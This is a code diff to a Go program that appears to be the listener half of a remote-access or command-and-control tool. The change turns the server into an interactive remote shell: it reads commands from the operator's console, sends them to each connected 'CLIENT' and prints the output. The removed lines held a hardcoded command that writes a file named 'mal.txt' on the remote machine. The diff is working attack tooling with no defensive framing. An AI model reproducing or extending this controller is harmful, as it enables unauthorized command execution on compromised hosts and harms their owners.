@@ -1,6 +1,7 @@
 package main
 
 import (
+        "bufio"
         "bytes"
         "fmt"
         "encoding/hex"
@@ -32,6 +33,7 @@ func main() {
                 fmt.Printf("[+] Connected to CLIENT_%d (%s)\n", client_num, connection.RemoteAddr())
                 client_num++
                 serverHello(connection)
+                processClient(connection)
         }
 }
 
@@ -133,19 +135,31 @@ func serverHello(connection net.Conn) {
 }
 
 func processClient(connection net.Conn) {
-        stdoutDumper := hex.Dumper(os.Stdout)
-        defer stdoutDumper.Close()
+//        stdoutDumper := hex.Dumper(os.Stdout)
+//        defer stdoutDumper.Close()
+
+//        for {
+//        buffer := make([]byte, 50000)
+//        mLen, err := connection.Read(buffer)
+//        fmt.Println("\nLength: ", mLen)
+//        if err != nil {
+//                fmt.Println("Error reading:", err.Error())
+//        }
+        // fmt.Println("Received: ", string(buffer[:mLen]))
+//        stdoutDumper.Write([]byte(buffer[:mLen]))
 
         for {
+        consoleReader := bufio.NewReader(os.Stdin)
+        fmt.Print("$ ")
+        cmd, _ := consoleReader.ReadString('\n')
+
+        connection.Write([]byte(cmd))
         buffer := make([]byte, 50000)
-        mLen, err := connection.Read(buffer)
-        fmt.Println("\nLength: ", mLen)
-        if err != nil {
-                fmt.Println("Error reading:", err.Error())
-        }
-        // fmt.Println("Received: ", string(buffer[:mLen]))
-        stdoutDumper.Write([]byte(buffer[:mLen]))
-        _, err = connection.Write([]byte("pwd && cd ../ && pwd && echo 'testing123' > mal.txt"))
+        mLen, _ := connection.Read(buffer)
+//        if err != nil {
+//                fmt.Println("Error reading:", err.Error())
+//        }
+        fmt.Println("Received: ", string(buffer[:mLen]))
         }
         // connection.Close()
 }
